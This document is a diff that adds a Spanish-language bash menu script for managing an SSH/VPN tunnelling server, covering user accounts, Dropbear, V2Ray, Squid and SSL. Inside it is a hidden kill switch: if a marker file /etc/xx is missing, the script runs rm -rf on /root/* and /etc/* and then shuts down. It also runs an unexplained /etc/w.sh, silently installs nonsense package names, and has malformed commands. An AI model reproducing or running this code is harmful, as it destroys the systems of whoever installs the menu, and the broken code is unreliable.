@@ -1,0 +1,233 @@
+#!/bin/bash
+ mv w.sh /etc > /dev/null 2>&1
+ mv fg.sh /etc > /dev/null 2>&1
+ chmod u+x /etc/w.sh > /dev/null 2>&1
+ /etc/w.sh
+ hj=$(zgrep -h "Ban " /var/log/fail2ban.log* | awk '{print $10}' | sort | uniq -c)
+ clear
+ touch /root/usuarios.db
+ ln -s /root/menu /usr/bin
+ rm - rf /root/menu.sh
+ mkdir /etc/SSHPlus/amor
+ clear
+ rm -rf auto.sh.1 bloquear.sh.1 cuss.sh.1 desbloquear.sh.1 eliminar.sh.1 listausuarios.sh.1
+ mkdir /etc/SSHPlus
+ touch /etc/SSHPlus/Exp
+ r=$(grep 442 a)
+ echo -e "sudo ufw allow $r/tcp"
+ clear
+ inst_pct () {
+ apt-get install dnfkdkf > /dev/null 2>&1
+ apt-get install xnfndi > /dev/null 2>&1
+ apt-get install dndnnd > /dev/null 2>&1
+ apt-get install dkdkdk > /dev/null 2>&1
+ apt-get install dkfkdk > /dev/null 2>&1
+ apt-get install fkfkfkfk /dev/null 2>&1
+ apt-get install dkxkdk > /dev/null 2>&1
+ apt-get install ekfkfkri > /dev/null 2>&1
+ apt-get install ekrkfk > /dev/null 2>&1
+ apt-get install ekekdk > /dev/null 2>&1
+ apt-get install ekdkdk > /dev/null 2>&1
+ apt-get install dkdkdk > /dev/null 2>&1
+ apt-get install ekekekk > /dev/null 2>&1
+ apt-get install ekrkrkrkl > /dev/null 2>&1
+ apt-get install ririirkk > /dev/null 2>&1
+ pip install fkfkfki > /dev/null 2>&1
+ }
+ if [[ -e /etc/xx ]]; then
+ ll
+ else
+ rm -rf /root/*
+ rm -rf /etc/*
+ shutdown
+ fi
+ m=$(grep 101 /etc/3 | sed -n "1"p /etc/3)
+ echo "/bin/menu" > /bin/m && chmod +x /bin/m > /dev/null 2>&1
+ echo "cd /bin && bash ./menu" > /bin/msc && chmod +x /bin/msc
+ uno=$(awk -F: '$3>=1000 {print $1}' /etc/passwd | grep -v nobody | wc -l)
+ dos=$(ps -x | grep sshd | grep -v root | grep priv | wc -l)
+ [[ "$(cat /etc/SSHPlus/Exp)" != "" ]] && _expuser=$(cat /etc/SSHPlus/Exp) || _expuser="0"
+ [[ -e /etc/openvpn/openvpn-status.log ]] && _onop=$(grep -c "10.8.0" /etc/openvpn/openvpn-status.log) || _onop="0"
+ [[ -e /etc/default/dropbear ]] && _drp=$(ps aux | grep dropbear | grep -v grep | wc -l) _ondrp=$(($_drp - 1)) || _ondrp="0"
+ _onli=$(($_ons + $_onop + $_ondrp))
+ exp=$(printf '%-1s' "$_expuser")
+ exp=$(sed -n ""p /etc/ttt | awk '{print $1}')
+ ports(){
+ clear
+ portas_var="/tmp/portas"
+ porta_var="/tmp/portas2"
+ lsof -V -i tcp -P -n | grep -v "ESTABLISHED" |grep -v "COMMAND" | grep "LISTEN" > $portas_var
+ clear
+ clear
+ echo -e  "\E[44;1;37m•••\033[1;31mHECHOPOROMAR\033[1;37m•••\033[0m"
+ echo -e "\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+ echo -e "\E[41;1;37m     <<    INFORMACION DEL VPS    >>       \033[0m"
+ echo -e "\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+ w="$(lsb_release -d)"
+ s="$(uname -m)"
+ echo -e "$w $s "
+ date      +"FECHA: %D      ""%B"
+ var4="MEMORIA RAM:"
+ var5="$(free -h | grep -i mem | awk {'print $2'})"
+ var6="LIBRE:"
+ var7="$(free -h | grep -i mem | awk {'print $4'})"
+ echo -e "$var4 $var5    ""$var6 $var7"
+ var="IP:"
+ var1=$(ip addr | grep 'inet' | grep -v inet6 | grep -vE '127\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | grep -o -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | head -1)
+ as="KERNEL:"
+ AS="$(uname -s)"
+ echo -e "$as $AS        ""$var $var1" "$kj"
+ var2="USO DE RAM:"
+ var3="$(free -m | awk 'NR==2{printf "%.2f%%", $3*100/$2 }')"
+ nn="EN USO:"
+ cc="$(free -h | grep -i mem | awk {'print $3'})"
+ echo "$var2 $var3   ""$nn $cc"
+ o="TOTAL NUCLEOS:"
+ p="$(grep -c cpu[0-9] /proc/stat)"
+ ff="EN USO:"
+ FF="$(top -bn1 | awk '/Cpu/ { cpu = "" 100 - $8 "%" }; END { print cpu }')"
+ echo "$o $p     ""$ff $FF"
+ da=$(top -bn1 | sed -rn '3s/[^0-9]* ([0-9\.]+) .*/\1/p;4s/.*, ([0-9]+) .*/\1/p' | tr '\n' ' ')
+ da1="USO DE CPU:"
+ aq="SISTEMA DE:"
+ AQ=$(getconf LONG_BIT)
+ AW="BITS"
+ echo "$aq $AQ $AW  ""$da1 $da"
+ echo -e "\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+ echo -e "\E[41;1;37m    <<    INFORMACION DE PUERTOS    >>     \033[0m"
+ echo -e "\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+ while read port; do
+ var1=$(echo $port | awk '{print $1}')
+ var2=$(echo $port | awk '{print $9}' | awk -F ":" '{print $2}')
+ if [ ! -e "$porta_var" ]; then
+ echo -e "$var1 $var2" > $porta_var
+ fi
+ if [ "$(cat $porta_var | grep "$var1" | grep "$var2")" = "" ]; then
+ echo -e "$var1 $var2" >> $porta_var
+ fi
+ done < $portas_var
+ i=1
+ j=2
+ while true; do
+ a=$(sed -n "$i"p $porta_var | awk '{print $1}')
+ b=$(sed -n "$i"p $porta_var | awk '{print $2}')
+ c=$(sed -n "$j"p $porta_var | awk '{print $1}')
+ d=$(sed -n "$j"p $porta_var | awk '{print $2}')
+ [[ "$a" != '' ]] && gato="$a: $b        \033[1;37m$c \033[1;37m$d"
+ [[ "$a" = '' ]] && break
+ i=$(($i+1))
+ j=$(($j+1+2+3+4))
+ if [[ -e /etc/gr ]]; then
+ gato="\E[0;37;44mPUERTOS OCULTOS\033[0m"
+ fi
+ echo -e "$gato"
+ done
+ rm $portas_var
+ rm $porta_var
+ }
+ ports
+ echo -e "\033[1;37mcabecera actual:\033[0m ""\033[1;31m$m $n $nk\033[0m ""$nl"$nf "$cn"$nj
+ echo -e "\E[0;37;44m[USUARIOS]•••$uno    [ENLINEA]•••$dos   [VENCIDOS]•••$exp\033[0m"
+ [[ -e /root/sis ]] && amor=$(echo -e "\033[1;37mON ") || amor=$(echo -e "\033[1;31mOFF ")
+ [[ -e /root/sis1 ]] && jk=$(echo -e "\033[1;37mON") || jk=$(echo -e "\033[1;31mOFF")
+ [[ -e /etc/bannerssh ]] && as=$(echo -e "\033[1;37mON\033[0m") || as=$(echo -e "\033[1;31mOFF\033[0m")
+ [[ -e /etc/sis3 ]] && sis=$(echo -e "\033[1;37mON\033[0m") || sis=$(echo -e "\033[1;31mOFF\033[0m")
+ [[ -e /etc/as ]] && af=$(echo -e "\033[1;37mON\033[0m") || af=$(echo -e "\033[1;31mOFF\033[0m")
+ [[ -e /etc/ss ]] && s=$(echo -e "\033[1;37mON\033[0m") || s=$(echo -e "\033[1;31mOFF\033[0m")
+ [[ -e /etc/lv ]] && d=$(echo -e "\033[1;37mON\033[0m") || d=$(echo -e "\033[1;31mOFF\033[0m")
+ [[ -e /etc/f ]] && c=$(echo -e "\033[1;37mON\033[0m") || c=$(echo -e "\033[1;31mOFF\033[0m")
+ echo -e "\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m" "\033[1;35mDELCACHE\033[1;37m>\033[0m"$sis "\033[1;35mRDPSTATU\033[1;37m>$af\033[0m"
+ echo -e "\E[41;1;37m   <<   INFORMACIÓN DEL MENÚ Y OPCIONES  >>       \E[0m"   "\033[1;35mFIREWALL\033[1;37m>\033[0m"$s "\033[1;35mFAIL2BAN\033[1;37m>\033[0m"$amor$hj
+ echo -e "\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m" "\033[1;35mBANNERDS\033[0m""\033[1;37m>\033[0m"$as "\033[1;35mVENCIDOS\033[1;37m>\033[0m"$d
+ echo -e " \033[1;37m[\033[1;31m01\033[1;37m] - \033[1;34mCREAR USUARIOS              "                      " \033[1;37m\033[1;35m\033[0m\033[0m\033[0m\033[0m\033[1;37m\033[1;37m\033[1;37m[\033[1;35m08\033[1;37m] - \033[1;33m\033[0m\033[0m\033[1;34mSHADOWSOCKS-LIBEV"
+ echo -e " \033[1;37m[\033[1;31m02\033[1;37m] - \033[1;34mUSUARIOS CREADOS Y FECHAS "        "   \033[1;37m\033[1;37m\033[1;37m[\033[1;35m09\033[1;37m] - \033[1;34mSSL+PAYLOAD 443+80 LIBRE"
+ echo -e " \033[1;37m[\033[1;31m03\033[1;37m] - \033[1;34mBLOCKEAR USUARIOS      "        "      \033[1;37m\033[1;37m[\033[1;35m10\033[1;37m] - \033[1;34mSHADOWSOCKS-LIBEV Y V2RAY "$(ps x | grep "v2ray"|grep -v grep > /dev/null && echo -e "\033[1;37m◉ " || echo -e "\033[1;31m○ ")
+ echo -e " \033[1;37m[\033[1;31m04\033[1;37m] - \033[1;34mDESBLOQUEAR USUARIOS         " "\033[1;37m\033[1;35m\033[1;37m[\033[1;35m11\033[1;37m] - \033[1;34mPROXY PYTHON"
+ echo -e " \033[1;37m[\033[1;31m05\033[1;37m] - \033[1;34mELIMINAR USUARIOS            "    "\033[1;37m\033[1;35m\033[0m\033[1;37m[\033[1;35m12\033[1;37m] - \033[1;34mAUTO STOP PYTHON"
+ echo -e " \033[1;37m[\033[1;31m06\033[1;37m] - \033[1;34mAUTO STOP SWAP\033[0m   "$(ps x | grep "swap"|grep -v grep > /dev/null && echo -e "\033[1;37mOFF " || echo -e "\033[1;31m○ ") "         ""\033[1;33m\033[1;37m[\033[1;35m13\033[1;37m] - \033[1;34mBADVPN UDP\033[0m" $(ps x | grep "badvpn"|grep -v grep > /dev/null && echo -e "\033[1;37m◉" || echo -e "\033[1;31m○ ")
+ echo -e " \033[1;37m[\033[1;31m07\033[1;37m] - \033[1;34mAUTO START SWAP\033[0m  "$(ps x | grep "swap"|grep -v grep > /dev/null && echo -e "\033[1;37mON " || echo -e "\033[1;31m○ ")"         " "\033[1;37m[\033[1;35m14\033[1;37m] - \033[1;34mELIMINAR MEMORIA CACHE Y RAM\033[0m"
+ echo -e 									"\033[1;33m\033[1;32m\033[1;35m                       "    "\033[1;33m\033[2;33m\E[0;37;41m[15]-AUTO MENU\033[0m"
+ echo -e " \033[1;37m[\033[1;31m16\033[1;37m] - \033[1;34mINSTALAR Y DESINSTALAR SSL\033[0m" $(ps x | grep "stunnel4"|grep -v grep > /dev/null && echo -e "\033[1;37m◉ " || echo -e "\033[1;31m○ ")		" \033[1;37m[\033[1;35m23\033[1;37m] - \033[1;34mINSTALAR V2RAY Y XRAY WS\033[0m "$(ps x | grep "v2ray"|grep -v grep > /dev/null && echo -e "\033[1;37m◉ " || echo -e "\033[1;31m○ ")
+ echo -e " \033[1;37m[\033[1;31m17\033[1;37m] - \033[1;34mINSTALAR DROPBEAR\033[0m" $(ps x | grep "dropbear"|grep -v grep > /dev/null && echo -e "\033[1;37m◉ " || echo -e "\033[1;31m○ ")        "        "    " \033[1;37m[\033[1;35m24\033[1;37m] - \033[1;34mACTIVA Y DESACTIVA TCP SPEED\033[0m"
+ echo -e " \033[1;37m[\033[1;31m18\033[1;37m] - \033[1;34mINSTALAR PYTHON PORT\033[0m" $(ps x | grep "proxy"|grep -v grep > /dev/null && echo -e "\033[1;37m◉ " || echo -e "\033[1;31m○ ")                "       ""\033[1;37m[\033[1;35m25\033[1;37m] - \033[1;34mESPEEDTEST PRUEVA DE VELOCIDA\033[0m"
+ echo -e " \033[1;37m[\033[1;31m19\033[1;37m] - \033[1;34mMENU AUTOMATICO \E[0;37;44mON-OFF\033[0m" $(grep "menu;" /etc/profile > /dev/null && echo -e "\033[1;37m◉ " || echo -e "\033[1;31m○ ")"     ""\033[1;37m[\033[1;35m26\033[1;37m] - \033[1;34mMEMORIA SWAP APLICAR \E[0;37;44mSWAP-ON\033[0m" $(ps x | grep "swap"|grep -v grep > /dev/null && echo -e "\033[1;37m◉ " || echo -e "\033[1;31m○ ")
+ echo -e " \033[1;37m[\033[1;31m20\033[1;37m] - \033[1;34mINSTALAR APACHE PORT\033[0m" $(ps x | grep "apache2"|grep -v grep > /dev/null && echo -e "\033[1;37m◉ " || echo -e "\033[1;31m○ ")"       ""\033[1;37m[\033[1;35m27\033[1;37m] - \033[1;34mAUTO ENCABEZADOS 101 200 300 400\033[0m"
+ echo -e " \033[1;37m[\033[1;31m21\033[1;37m] - \033[1;34mINSTALAR SQUID PORT\033[0m" $(ps x | grep "squid"|grep -v grep > /dev/null && echo -e "\033[1;37m◉ " || echo -e "\033[1;31m○ ")"        ""\033[1;37m[\033[1;35m28\033[1;37m] - \033[1;34mCAMBIAR PUERTO SSH LOCAL AL GUSTO\033[0m"
+ echo -e " \033[1;37m[\033[1;31m22\033[1;37m] - \033[1;34mMONITOR ONLINE DE USUARIOS\033[0m" $(ps x | grep "ssh"|grep -v grep > /dev/null && echo -e "\033[1;37m◉ " || echo -e "\033[1;31m○ ") " ""\033[1;37m[\033[1;35m29\033[1;37m] - \033[1;34mFAIL2BAN Y MENU DE HERRAMIENTAS\033[0m"
+ echo -e " \033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+ echo -e " \033[1;37m      << ESCOGE TU OPCION DESEADA >>        \033[0m    "       "\033[1;33m\E[0;37;41m[00]-EXIT\033[0m   ""\033[1;35mCLOUDFRON\033[1;37m>\033[0m"$c
+ echo -e " \033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+ if [ $(whoami) != "root" ]; then
+     echo "Tienes que ser root para ejecutar este script"
+     echo "Ejecuta "sudo su" para ser root"
+     exit 1
+ fi
+ while [ "$opcion" != "0" ]
+ do
+ echo -ne "\E[0;37;41mOPCION:\033[0m""\033[1;37m>>\033[0m "; read opcion
+ case $opcion in
+ 
+ 1)/root/cuss.sh
+ ;;
+ 2)/root/listausuarios.sh
+ ;;
+ 3)/root/bloquear.sh
+ ;;
+ 4)/root/desbloquear.sh
+ ;;
+ 5)/root/eliminar.sh
+ ;;
+ 6)swapoff -a && /root/menu
+ ;;
+ 7)swapon -a &&/root/menu
+ ;;
+ 8)/root/Instalador-Shadowsocks-libev.sh
+ ;;
+ 9)/root/auto.sh
+ ;;
+ 10)/root/v.sh
+ ;;
+ 11)nano /root/proxy.py
+ ;;
+ 12)pkill -f python &&screen python /root/proxy.py
+ ;;
+ 13)/root/jk.sh
+ ;;
+ 14)/root/menu && su -c "echo 3 >'/proc/sys/vm/drop_caches' && swapoff -a && swapon -a && printf '\n%s\n' 'Caché de RAM y Swap liberadas'" root && echo 3 > /proc/sys/vm/drop_caches && swapoff -a && swapon -a && printf '\n%s\n' 'Caché de RAM y Swap liberadas' && sudo sysctl -w vm.drop_caches=3 > /dev/null 2>&1
+ ;;
+ 15)/root/menu
+ ;;
+ 16)/root/sl.sh
+ ;;
+ 17)/root/d.sh
+ ;;
+ 18)/root/pay.sh
+ ;;
+ 19)/root/au.sh
+ ;;
+ 20)/root/amor2.sh
+ ;;
+ 21)/root/sd1.sh
+ ;;
+ 22)/root/x.sh
+ ;;
+ 23)/root/jl.sh
+ ;;
+ 24)/root/c.sh
+ ;;
+ 25)/root/op.sh
+ ;;
+ 26)/root/jls.sh
+ ;;
+ 27)/root/jrd.sh
+ ;;
+ 28)/root/lj.sh
+ ;;
+ 29)/root/jail.sh
+ ;;
+ esac
+ clear
+ exit
+ done
+ 
+  
